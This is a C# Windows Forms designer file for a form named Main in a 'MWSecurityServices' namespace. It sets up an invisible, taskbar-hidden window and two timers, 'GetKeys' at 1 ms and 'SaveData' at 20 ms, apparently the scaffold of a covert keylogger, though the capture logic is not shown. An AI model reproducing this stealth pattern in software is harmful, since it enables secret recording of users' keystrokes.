namespace MWSecurityServices
{
    partial class Main
    {
        /// <summary>
        /// Required designer variable.
        /// </summary>
        private System.ComponentModel.IContainer components = null;

        /// <summary>
        /// Clean up any resources being used.
        /// </summary>
        /// <param name="disposing">true if managed resources should be disposed; otherwise, false.</param>
        protected override void Dispose(bool disposing)
        {
            if (disposing && (components != null))
            {
                components.Dispose();
            }
            base.Dispose(disposing);
        }

        #region Windows Form Designer generated code

        /// <summary>
        /// Required method for Designer support - do not modify
        /// the contents of this method with the code editor.
        /// </summary>
        private void InitializeComponent()
        {
            this.components = new System.ComponentModel.Container();
            this.GetKeys = new System.Windows.Forms.Timer(this.components);
            this.SaveData = new System.Windows.Forms.Timer(this.components);
            this.SuspendLayout();
            // 
            // GetKeys
            // 
            this.GetKeys.Enabled = true;
            this.GetKeys.Interval = 1;
            this.GetKeys.Tick += new System.EventHandler(this.GetKeys_Tick);
            // 
            // SaveData
            // 
            this.SaveData.Enabled = true;
            this.SaveData.Interval = 20;
            this.SaveData.Tick += new System.EventHandler(this.SaveData_Tick);
            // 
            // Main
            // 
            this.AutoScaleDimensions = new System.Drawing.SizeF(19F, 37F);
            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
            this.ClientSize = new System.Drawing.Size(1102, 450);
            this.Name = "Main";
            this.Opacity = 0D;
            this.ShowInTaskbar = false;
            this.Text = "Main";
            this.ResumeLayout(false);

        }

        #endregion

        private System.Windows.Forms.Timer GetKeys;
        private System.Windows.Forms.Timer SaveData;
    }
}

